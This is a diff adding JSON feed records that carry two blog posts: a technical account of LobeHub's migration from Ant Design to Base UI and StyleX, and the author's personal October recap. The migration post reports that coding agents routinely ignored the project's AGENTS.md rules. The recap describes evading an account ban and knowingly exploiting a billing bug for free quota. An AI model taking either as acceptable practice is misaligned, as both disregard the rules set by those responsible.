+        "src:innei",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://innei.in/posts",
+        "https://innei.in/en/posts/tech/react-native-to-uikit-migration"
+      ],
+      "refs": {
+        "actor": {
+          "login": "innei",
+          "url": "https://innei.in/posts"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "innei",
+          "name": "Shiro (Innei)",
+          "home_url": "https://innei.in/posts"
+        },
+        "article": {
+          "title": "Migrating from React Native to UIKit in 87 Hours: Hollow Out the Data Layer, Then Invert the Host",
+          "url": "https://innei.in/en/posts/tech/react-native-to-uikit-migration",
+          "content_sha256": "1fcfe7cb6a3114b3a75102d0ba081b112394d5fd3189d6334f2fb8114f1cec23"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": true,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    },
+    {
+      "id": "a:0ed9df84a952389a",
+      "who": "innei",
+      "who_url": "https://innei.in/posts",
+      "action": "publish",
+      "target": "十个月，给 LobeHub 换掉 Ant Design：向 Base UI 与 StyleX 的渐进式迁移",
+      "target_url": "https://innei.in/en/posts/tech/lobehub-antd-to-base-ui-stylex-migration",
+      "text": "innei published: 十个月，给 LobeHub 换掉 Ant Design：向 Base UI 与 StyleX 的渐进式迁移",
+      "at": "2026-11-04T11:08:49+00:00",
+      "external_id": "a:0ed9df84a952389a",
+      "url": "https://innei.in/en/posts/tech/lobehub-antd-to-base-ui-stylex-migration",
+      "title": "十个月，给 LobeHub 换掉 Ant Design：向 Base UI 与 StyleX 的渐进式迁移",
+      "content": "The starting point: a performance tuning pass\nDuring my first month at LobeHub, I ran a performance optimization pass, documented with benchmarks in\n\"Performance and DX Optimizations at LobeHub\"\n. The heaviest bottlenecks in that pass were all style-related: CSS-in-JS Flexbox components like react-layout-kit numbered in the hundreds on a single page, each generating CSS; the\nuseStyle\nrunning across almost every component recalculated styles on every re-render; and a single antd Tooltip took 0.5ms on its own. The first two could be fixed by switching styling solutions, but Tooltip required a full rewrite. I rebuilt both it and Popover with Base UI—the first time Base UI was used in lobe-ui.\nWith those fixes in place, the remaining overhead came from antd components themselves. Since antd's UI was also notoriously hard to customize deeply, replacing it was the obvious next move. I had wanted to do this for a while, but never started because manually rewriting a codebase of this size was unrealistic, and AI wasn't capable enough yet.\nWhen we actually started, this was what we were facing:\n@lobehub/ui\nhad almost a hundred component modules, with behavior tightly coupled to antd and all component styles written in Emotion-based\nantd-style\n, which generated CSS at runtime and injected it into the document on every page load. Downstream, five ecosystem libraries—icons, editor, charts, tts, and fluent-emoji—declared it as a peer dependency, and at the top layer, hundreds of business files in lobe-chat directly imported from\nimport ... from 'antd'\n. Meanwhile, product features shipped weekly, so maintaining a long-running rewrite branch wasn't an option. The entire migration had to happen without interrupting delivery, split into two parallel tracks: first swap out the underlying component foundation from antd to Base UI, then switch styling from runtime Emotion to compile-time StyleX.\nLetting old and new components coexist in the same package\nlobe-ui#448\nrewrote Tooltip. Beyond performance gains, it also resolved seven Linear issues: positioning drift, tooltips failing to dismiss, and elements snapping back to (0, 0) when their host unmounted. Base UI is headless, providing only behavior and accessibility while leaving DOM structure and styling to us, so we could customize everything freely without fighting antd's limitations.\nThe next question was how to make the transition. With weekly product releases and several downstream libraries tracking our changes, ripping out antd all at once wasn't practical. Instead, I opted for coexistence: build new components with Base UI, package them alongside the antd versions, and migrate product call sites one component at a time. Throughout January 2026, we gradually added\nlobe-ui#444\n's Base UI Menu–based DropdownMenu and ContextMenu, alongside LobeSwitch and LobeSelect. To avoid name clashes with their antd counterparts, they initially carried a Lobe prefix or a V2 suffix.\nOn March 2,\nlobe-ui#467\nreleased v5, formalizing this coexistence in the package structure: adding a\n@lobehub/ui/base-ui\nsubpath where LobeSelect and LobeSwitch were moved (dropping their prefixes), while DropdownMenu, Toast, ContextMenu, and ScrollArea were exported from there as well. The package itself also became ESM-only. Subsequent components followed the exact same pattern: the implementation lived under\nsrc/base-ui/\n, while the root entry only re-exported it. For instance, when\nlobe-ui#486\nmigrated Popover,\n@lobehub/ui\nand\n@lobehub/ui/base-ui\nwere both valid, requiring zero changes in product code. From here on, migrating a component took just two steps: write the new implementation under base-ui, then switch the call sites in product code.\nComponents had to be drop-in replacements, locked down with linting once migrated\nBetween March and September, components were ported into base-ui roughly in this order: overlays, basic controls, forms, display, and layout.\nOverlays first\nThis came down to two reasons. To begin with, overlays naturally belong together: Dropdown, Popover, Tooltip, Modal, and Drawer all share floating positioning and stacking management, making them ideal to tackle together. Later,\nlobe-ui#518\nunified their z-index management under a single layer manager. The second reason was how Modal was structured. Antd's Modal is primarily declarative, requiring components to be mounted on the React tree in advance:\nopen\nis\nfalse\n, its children still render, re-rendering whenever ancestor state updates. With multiple Modals on a page, that overhead adds up on every single render. An imperative Modal creates an instance only when invoked and destroys it when closed, shifting the cost to the user action that opens it. I previously wrote about this in\n\"Why I Recommend Imperative Modals,\"\nand base-ui's Modal has supported both imperative and declarative patterns since its\nfirst release\n.\nIn the top example, every closed Modal participates in every render; in the bottom example, only the active Modal exists in the tree.\nMigration windows by component category\nAfter overlays came basic controls, forms, and display components. They all followed the exact same workflow: merge the new component into base-ui, switch product call sites over, and finally ban the legacy import via ESLint. Each bar below runs from when the new component merged to when the legacy import was banned:\nA stark dividing line is visible around August. Before August, taking a component category from initial merge to banning legacy imports took weeks or months: Modal and Select took nearly four months, and form controls took 36 days. After August, Drawer took 5 days, Alert 6 days, Skeleton 3 days, DraggablePanel and Tree 2 days each, while ActionIcon, Avatar, Tag, and Text took just 1 day combined. The migration process hadn't changed—what changed was the models. Anthropic released Claude Fable 5 on June 9 and Claude Opus 5 on July 24. To me, Opus 5 felt exceptionally strong at front-end tasks, and at half the price of Fable 5, it cost about the same as Opus 4.8. By August, commits in lobe-chat switched from Opus 4.8 to Opus 5, and Fable 5 usage was rising too. The bars for Tabs and Segmented are also very short, but only because the initial preset banned five components all at once on June 26—not because they migrated faster.\nComponents like DropdownMenu, Tooltip, and Popover were replaced in place at the root entry point without legacy versions to ban, so they aren't shown in the chart. Commits for each component:\nModal\n,\nMenu\n,\nTooltip\n,\nButton\n,\nForm controls\n,\nDrawer\n,\nAlert\n,\nActionIcon and three others\n,\nSkeleton\n,\nDraggablePanel\n, and\nTree\n.\nEach new component had to be a drop-in replacement, matching the old version in both API and visuals so switching only meant changing import paths. In lobe-ui#621, Tag's color resolution was ported straight from the old implementation: 13 preset colors, 5 system colors, and and all four variants (solid, filled, outlined, borderless) across three sizes had to match. Avatar replaced antd Avatar with native\nimg\n, keeping the fallback on load failure and the +N counter for AvatarGroup. After Drawer merged, a separate\ncommit\nfollowed to align its surface, edges, and drop shadows with antd Drawer.\nThe ban rules lived in lobe-ui's built-in ESLint preset, inherited directly by product projects. The\ninitial preset\non June 26 deprecated and banned imports of five antd-based wrappers: Button, Modal, Segmented, Select, and Tabs. When that first version went live, product code still had numerous legacy calls, which were temporarily grandfathered via an allowlist (detailed in the next section). From that point on, rules for each component category were added to the preset only after downstream projects had cleared all legacy imports. The PR description in\nlobe-ui#610\nwas blunt: downstream migrations had removed legacy imports for these components, and this PR turned the migration boundary into an enforceable lint rule. That way, new code couldn't introduce old patterns, and legacy usage could only ever go down.\nOn the product side: freeze new usage, then clear legacy code category by category\nEach time lobe-ui finished migrating a component category, lobe-chat had to update corresponding call sites. The chart below shows the number of files directly importing antd in lobe-chat, sampled biweekly:\nUntil mid-June, this line kept rising—climbing from 338 in mid-February to 485 on June 15. While legacy calls were being replaced, new features continued using antd. By then, the team had already delegated most product coding to AI, and component precedence had long been codified into\nAGENTS.md\nand react skills:\n@lobehub/ui/base-ui\nAny component available in it had to be imported from it, with same-named components at the root entry point off-limits, leaving antd strictly as a fallback when neither had it. Agents routinely ignored this. Because training data and hundreds of existing files demonstrated antd patterns, PRs for new features kept using legacy components even after lobe-ui published replacements. To an agent, docs are merely suggestions. The only way to stop them was to make violations break the build: ESLint fails directly, and lint-staged runs the same checks in pre-commit hooks to block the commit.\nThat was precisely what\nlobehub#16334\ndid on June 26: it adopted lobe-ui's ESLint preset, banning the five legacy wrappers (Button, Modal, Segmented, Select, Tabs) as well as antd-style's\ncreateStyles\n; existing call sites (354 in total) were added to\neslint-suppressions.json\nfor temporary exemption, while any new violations failed immediately. Afterward, whenever a batch was migrated, we ran\neslint --prune-suppressions\n, ensuring the allowlist only ever shrank.\nLegacy code was cleared category by category: each PR targeted only one component category, but covered the entire repository. The count dropped slowly over the summer, followed by a steep drop in early October.\nlobehub#20247\ntouched 285 files in one go, swapping out all remaining instances of Table, DatePicker, Menu, List, Input variants, and more, eliminating 163 files with direct antd imports. The PR included before-and-after screenshots compared against canary for verification, and five component library issues caught along the way were patched in\nlobe-ui#675\n. Next,\nlobehub#20317\nmigrated forms, removing another 63 files;\nlobehub#20408\nupdated menu item types to lobe-ui's, shedding 21 files; finally,\nlobehub#20503\ncleaned up the remainder. The two files still remaining on November 1 in the chart are test fixtures for alint.\nBehavioral discrepancies are harder to catch than visual differences\nVisual differences are easy to spot by comparing screenshots side by side, but behavioral discrepancies usually don't surface until a user saves data. After lobehub#20317 migrated forms to base-ui, the values returned on submit differed between the two:\nantd Form\nbase-ui Form\nReturned on submit\nValues of currently mounted\nForm.Item\nfields only\nEntire form store\nConditionally hidden fields\nDiscarded\nSubmitted together\ninitialValues\nextra keys\nDiscarded\nSubmitted together\nFields that used to be quietly dropped were now persisted together. Switching a plugin's authentication from bearer to none left the old token behind. Similarly, switching transport from HTTP to stdio kept the old URL, causing later re-installations to fetch manifests from that stale address and overwrite existing settings.\nlobehub#20644\nadded a\npruneHiddenFields\nstep before saving to prune fields that don't belong to the active type.\nThe compatibility layer itself can introduce bugs. The\nImperativeModal\nwrapper, created for a smooth migration, unmounted its content in the very same commit that\nopen\nbecame\nfalse\n, while base-ui's panel still had a 120ms exit animation—so closing the Skill Store details modal caused the content to collapse prematurely. Instead of patching the wrapper,\nlobehub#17941\nreplaced all 11 call sites with imperative\ncreateModal\nContent lives inside a ModalHost and is only unmounted after the exit animation finishes.\nBumping the ecosystem libraries along with lobe-ui's majors\nAs we wrapped up the app-level cleanup, the intermediate ecosystem tier had to come along. Beyond lobe-ui, lobe-chat depends on icons, editor, charts, tts, and fluent-emoji—most of which declare lobe-ui as a peer dependency:\nWhenever lobe-ui bumped a major version, the ecosystem layer broke: downstream packages lost exports they still needed, or peer versions fell out of sync. As a result, we always released them all together:\nlobe-ui\nRelease date\nicons\neditor\ncharts\nfluent-emoji\nv3 (upgraded to antd v6)\n2025-12-20\nv3\nv2\nv3\nv4 (static styles)\n2025-12-24\nv4\nv3\nv4\nv5 (base-ui subpackage)\n2026-03-02\nv5\nv4\nv5\nunchanged\nv6 (dropped antd)\n2026-10-15\nv6\nv5\nv6\nv5\nv6 was by far the biggest set of changes, split into a stacked sequence of PRs:\nlobe-ui#699\nremoved the antd components and\nThemeProvider\n;\nlobe-ui#700\ndropped the antd, antd-style, and rc-* dependencies; and\nlobe-ui#702\nmerged\nsrc/base-ui\ncompletely empty.\n@lobehub/ui/base-ui\nback into the root directory, getting rid of the base-ui subpath. With the coexistence phase over, we tore down that v5 scaffolding and exported the new components straight from the root entry. In early October, the downstream libraries first ported their own component usage over to base-ui (\nlobe-editor#222\nand\nlobe-charts#32\n), before each bumped to lobe-ui 6 and stripped out antd.\nThis cascade of changes couldn't be released and verified piecemeal. Instead, we tested across repos using pkg.pr.new preview packages: PRs for lobe-ui and the five downstream libraries each published preview packages, and\nlobehub#20503\npointed all dependencies to those preview URLs. We compared lobe-chat against production page by page to ensure zero visual regressions before officially publishing in dependency order and and then switched back to real version numbers. PR #20503 alone updated imports across 2,728 files, purged antd from 24 workspace packages, and finally left\npnpm ls -r antd\nwith nothing to show.\nMoving styles from runtime generation to build-time compilation\nDropping antd took care of components, but styles were still being generated at runtime. lobe-ui wrote its component styles in antd-style, built on Emotion: on page load, JavaScript generated CSS on the fly and inserted it into the page. The initial optimization pass replaced dynamic hooks with\ncreateStaticStyles\n, ensuring components no longer recomputed styles on every re-render. Yet the insertion step remained. In September,\nlobehub#19066\npre-computed purely static calls at build time, slashing the time spent on styles during cold home page loads from ~56ms to ~28ms. The remaining ~14ms came from\ninsertRule\nitself—an unavoidable cost as long as emotion was in the loop.",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://innei.in/en/posts/tech/lobehub-antd-to-base-ui-stylex-migration",
+      "content_chars": 14848,
+      "content_sha256": "de453305925a0dc0ad398f987b412a8462899b224cfd60024948813e2f3140a1",
+      "content_fetched_at": "2026-11-28T03:15:04.946012+00:00",
+      "author": "innei",
+      "author_name": "Shiro (Innei)",
+      "author_url": "https://innei.in/posts",
+      "published_at": "2026-11-04T11:08:49+00:00",
+      "collected_at": "2026-11-28T03:11:32.768744+00:00",
+      "tags": [
+        "kind:publish",
+        "src:innei",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://innei.in/posts",
+        "https://innei.in/en/posts/tech/lobehub-antd-to-base-ui-stylex-migration"
+      ],
+      "refs": {
+        "actor": {
+          "login": "innei",
+          "url": "https://innei.in/posts"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "innei",
+          "name": "Shiro (Innei)",
+          "home_url": "https://innei.in/posts"
+        },
+        "article": {
+          "title": "十个月，给 LobeHub 换掉 Ant Design：向 Base UI 与 StyleX 的渐进式迁移",
+          "url": "https://innei.in/en/posts/tech/lobehub-antd-to-base-ui-stylex-migration",
+          "content_sha256": "de453305925a0dc0ad398f987b412a8462899b224cfd60024948813e2f3140a1"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": true,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    },
+    {
+      "id": "a:8920ef59b3b9441c",
+      "who": "innei",
+      "who_url": "https://innei.in/posts",
+      "action": "publish",
+      "target": "十月未央",
+      "target_url": "https://innei.in/en/notes/2026/10/24/2026-10-recap",
+      "text": "innei published: 十月未央",
+      "at": "2026-10-24T18:16:19+00:00",
+      "external_id": "a:8920ef59b3b9441c",
+      "url": "https://innei.in/en/notes/2026/10/24/2026-10-recap",
+      "title": "十月未央",
+      "content": "October Lingers\nAutumn\nMixed feelings\nReads\n1,454\nLikes\n2\ntranslated from Simplified Chinese\n↗\nAI\nDictation, Assisted, and Title\nLanguage\nEnglish\nSynopsis\nopen yohaku ↗\nIt's already been over two weeks since my last recap, so it's time to catch up on what's been happening lately.\nNyatabi Hits the App Store\nLast time, I mentioned running into so many headaches after a trip that I decided to build an app. At the end of my last post, I wrote, \"Musubicho is still in development and not finished yet.\" Less than two weeks later, I renamed it Nyatabi (喵旅) and officially launched it on the App Store. That said, I haven't even been the first one to really test it out in the wild. I'm such a homebody that even though a trip sparked the project, I haven't had the chance to use all its features myself yet. I just love building products—created purely out of passion.\nIt's live on the App Store now, and I put together a decent landing page for it. Feel free to check it out! (Though it's iOS-only for now.)\nNyatabi — your AI travel companion for iPhone\nPlan with Musubi, explore together, split spending fairly and turn your route into memories. Your whole journey, in one local-first iPhone app.\nNyatabi\nBeyond helping you map out trips, it lets an agent handle expense tracking and bill splitting on the go (either by snapping receipts or just telling it what you spent). In group chats, the agent can scout nearby restaurants or pull up your friends' locations. And once the trip wraps up, you can replay your route, generate an auto-edited highlight video, or export a detailed travel footprint report.\nBefore the official release, I shot a 4-part short video series walking through the entire flow: pre-trip planning → snapping receipts to split expenses on the go → settling balances with minimum transfers → everyday roommate bookkeeping. On October 16, I posted a full 2-minute demo.\nAlong the way, I also open-sourced the rounded-line icon set used in Nyatabi at\nicons.nyatabi.app\n.\nEngineering shortcuts vs. engineering rigor: refusing to be a human test runner, I wired up XCUITest across two physical iPhones so agents could handle the entire closed loop of \"implement → verify → fail → fix\" on their own (check out my technical post, \"\nMy AI-Native iOS Development & Verification Workflow\n\", for details).\nIt could be handy whether you're traveling or just going about everyday life: I've always found life-logging footprint apps a bit awkward to use, so I baked my own footprint features right in to track daily routines as well. I don't want to turn this into a full-on product pitch, so I'll stop here. If you're interested, feel free to give it a spin.\nNyatabi: AI Travel Planner App - App Store\nDownload Nyatabi: AI Travel Planner by Moeru AI on the App Store. See screenshots, ratings and reviews, user tips, and more apps like Nyatabi: AI Travel Planner…\nApp Store\nAI in the Trenches\nA Love-Hate Relationship with Claude\nI had a backup Claude alt account that managed to hold out for over two weeks, so I decided to upgrade it. Went from Pro to Max, only to get slapped with an instant ban—no refund, either. I was so anxious that night that I stayed up by myself until 5 a.m. Eventually, I couldn't help setting up yet another account, and that one's somehow still alive.\nOn top of that, my $DRAM shares kept tumbling before I could break even, so those days felt like a brutal double blow from Anthropic and $DRAM. It also got me calculating the real cost of compute inflation: last year, a $20 Claude subscription felt like it could do so much; now, even the $200 Max tier barely scratches the surface. By comparison, Apple's $99/year developer membership is so cheap it's almost moving.\nOpenAI's \"God Tier\" Account and Kimi Falling Flat on Its Face\nThere was a funny little detour along the way. Around the 20th, I noticed a bug in OpenAI: an old 20x subscription was still usable even after downgrading or canceling. I honestly thought I'd struck gold with some chosen \"god-tier\" account. But by day five of freeloading, the bug got patched and my quota went straight to zero.\nThen on the 23rd, I dropped $19 on Kimi, wanting to see how it compared to $20 Claude. I asked it to write a website footer—and before it even finished, barely ten minutes in, I slammed right into a 5-hour rate limit. Might as well just call yourselves QueueShot AI. When it comes to domestic models, everyone should just use DeepSeek—what are the rest of these garbage knockoffs even doing? DeepSeek is the only one that can actually play: no token sales, no bullshit. The API pricing is right there: take it or leave it. The TPS is right there too—DeepSeek 4.1 Flash pushes over 200 TPS, and at those prices, burn through as much as you want.\nUnlike Kimi—their greed this time is honestly shameless: zero compute power, but pulling that classic Lei Jun artificial scarcity playbook and taking users for fools to the extreme.\nRyugi (流儀) — Open-Source Claude Artifacts\nAfter getting jerked around like that, I thought: why not just build my own version of Claude Artifacts? I genuinely love using that feature. For docs, artboard designs, and architecture sketches, it's just so damn good—a product genuinely made with care.\nBut being locked into Claude's proprietary subscription was a dealbreaker. So what choice did I have? Build it myself.\nClaude Artifacts support five types, and the ones I use most are Artboard, Document, and HTML. Sick of taking Anthropic's nonsense, I cobbled together a standalone workbench called \"Ryugi\" (\nryugi.innei.dev\n).\nBuilding this brought an unexpected bonus too: it completely changed my view of Codex's design skills. I used to think Codex was garbage at design, and just on the 10th I had tweeted about how miserable it was trying to write UI with it. But once I plugged it into Ryugi's Artboard workflow, it turned out to be surprisingly solid—I guess I was just using it wrong before. To my surprise, that tweet blew up, racking up 93K impressions and over 700 bookmarks.\nI've been using it for a few days now, putting it through heavy daily use and constantly refining it. The cloud environment is live too, so now it helps me brainstorm, work on designs, hash out architecture docs, and even knock out small feature requests on the side.\nThe experience genuinely captures the vibe of Claude Artifacts now. Hooking this workflow up to other harnesses—like DeepSeek or Codex—makes them dramatically more useful. If you haven't tried it yet, you really should.\nRepository\n· Innei\n1.0k\nartideck\nArtideck — Artifacts for coding agents, made to decide with you. Your agent draws artboards, design docs, whiteboards, decks, and verify reports; you pick, comment, and pass right on the page.\nJavaScript\nHere are a few UI designs and animations I generated using DeepSeek, Codex, and Grok:\nDocument · 历史回看 · Ryugi\nView “Document · 历史回看” on Ryugi Cloud, an artboard artifact.\nRyugi\n简单模式 · 描述显隐 · Ryugi\nView “简单模式 · 描述显隐” on Ryugi Cloud, an artboard artifact.\nRyugi\nLobeHub · AI Provider 接入 · Ryugi\nView “LobeHub · AI Provider 接入” on Ryugi Cloud, an artboard artifact.\nRyugi\n室内乐与夏日小品 · Nine Pieces · Ryugi\nView “室内乐与夏日小品 · Nine Pieces” on Ryugi Cloud, an HTML artifact.\nRyugi\nLobeHub Bids Farewell to AntD\nOn the work front: I've been here for almost a year now. Back when I first joined, I declared that I was going to ditch AntD once and for all. That turned into a ten-month marathon, but on the 9th of this month, I finally pulled it off—migrating everything over to\n@base_ui\n+\nStyleX\n(meaning\nlobe-ui\nv6).\nLooking back at the numbers, the engineering scale was pretty wild:\nlobe-ui\nrewrote 54 components on top of Base UI, and AntD dependencies in\nlobe-editor\n,\nlobe-charts\n, and\nlobe-icons\nwere completely eliminated.\nThe main repo has over 11,000 TypeScript files. Replacing the underlying component library spanned 28 PRs and touched 3,242 files, with the single largest PR modifying 1,040 files.\nAlong the way, we also migrated our CSS-in-JS setup to StyleX, slashing the original 179 emotion files down to just 3. The most satisfying part was running 5 agents across parallel branches: in three and a half hours, they plowed through 84 commits. We then ran regression tests across 45 routes using 1,000 screenshot comparisons and computed-style diffs, reliably catching 4 regressions.\nGetting rid of AntD paid off right away. Bundle sizes shrank dramatically, and pages feel noticeably snappier. Thinking back, before AI agents existed, a core refactor of this scale would have easily taken an entire team a full quarter of grinding. But with today's models being so capable, I managed to knock out this massive project almost entirely on my own.\nThe Story Ends Here\nThroughout October, blind dates from family and friends were nonstop, but most of the time chatting was pretty draining. Earlier in the month, I tweeted a rant saying some WeChat chats feel like \"an LLM running on a potato server, taking hours of inference just to spit out a few characters, and if you don't send a request, you'll never get a response.\" That tweet unexpectedly racked up over 70,000 views, and predictably enough, I got hit with the \"you're a nice guy\" card in real life soon after.\nBut just a few days later, through another blind date, I unexpectedly met someone I could genuinely click with—something that hadn't happened in a long time.\nI find myself wanting deeper conversations lately—talking about fundamental values, life outlooks, and thoughts on the future. In day-to-day life, finding someone who can actually match that energy is rare. But that night—which also happened to be our last conversation—we talked about so much. Beyond having plenty of shared interests, what hit hardest was a real resonance in who we are deep down. Just knowing someone on that exact same wavelength actually exists was a wonderful, lucky surprise.\nUnfortunately, she felt our personalities were just too similar to be a good match. In the end, we parted ways gracefully, and that was where the story ended.\nTurning My Resume into a Canvas\nAnother project I spent a lot of time on was completely rebuilding my personal resume page for Programmer's Day on October 24, launching it at\nresume.innei.in/lab/\n.\nThe spark was simple: surfing online recently, I saw a few personal sites and resumes that looked amazing, so I wanted to bring my own ideas into the mix and polish up something of my own. A traditional single-page format can't hold very much, so I turned it into a canvas you can freely pan, zoom, and explore—connecting all the projects I've worked on and milestones I've reached over the six or seven years since college into one continuous timeline.\nWorking on this canvas also ended up unlocking some new skills. To give the page some fitting background music, I dove into arranging with realistic virtual instruments, tweaking synthesis, and fine-tuning the details (huge thanks to\n@wibus_wee\nfor walking me through Ozone mastering), and I even built an interactive sheet music display into the canvas.\nCramming a bunch of music arrangement and audio mastering just to build a resume was an unexpected bonus. Once I get around to picking music theory back up properly, I really should build an app for instruments and music theory.\nThanks for reading this far.\nAlso, I recently updated the background on this blog with dynamic nature scenes that change with the seasons and time of day. I even split the effect out into its own standalone preview page (\ninnei.in/dev-demos/backgrounds\n); if you're interested, feel free to click in and play around with it.",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://innei.in/en/notes/2026/10/24/2026-10-recap",
+      "content_chars": 11590,
+      "content_sha256": "0a1b5c242f3e691a06162722af649e03b7046267e29d48950018f9bc2cf496bd",
+      "content_fetched_at": "2026-11-28T03:15:06.389984+00:00",
+      "author": "innei",
+      "author_name": "Shiro (Innei)",
+      "author_url": "https://innei.in/posts",
+      "published_at": "2026-10-24T18:16:19+00:00",
+      "collected_at": "2026-11-28T03:11:32.768744+00:00",
+      "tags": [
+        "kind:publish",
+        "src:innei",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://innei.in/posts",
+        "https://innei.in/en/notes/2026/10/24/2026-10-recap"
+      ],
+      "refs": {
+        "actor": {
+          "login": "innei",
+          "url": "https://innei.in/posts"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "innei",
+          "name": "Shiro (Innei)",
+          "home_url": "https://innei.in/posts"
+        },
+        "article": {
+          "title": "十月未央",
+          "url": "https://innei.in/en/notes/2026/10/24/2026-10-recap",
+          "content_sha256": "0a1b5c242f3e691a06162722af649e03b7046267e29d48950018f9bc2cf496bd"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": true,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    }
+  ]
+}
